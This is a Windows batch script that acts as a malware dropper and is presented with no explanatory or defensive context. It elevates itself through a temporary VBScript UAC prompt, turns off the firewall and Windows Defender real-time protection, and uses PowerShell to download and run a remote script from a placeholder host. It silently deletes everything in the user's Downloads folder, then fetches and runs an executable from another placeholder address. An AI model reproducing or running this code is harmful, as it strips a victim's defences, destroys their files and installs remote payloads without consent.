@echo off
set "params=%*"
cd /d "%~dp0"

:: Remove temporary script if it exists
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"

:: Check for admin privileges
fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: Disable firewall and Windows Defender (use with caution)
Netsh advfirewall set allprofiles state off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

:: Download and run backup payload
start /min powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://%lhost%/%backup%.sh'))"

:: Delete all files in Downloads directory
cd %USERPROFILE%\Downloads
del /Q *

:: Run the main payload
start /min /b chrome http://%ip%/%name%.exe
timeout 12
start %name%.exe
exit
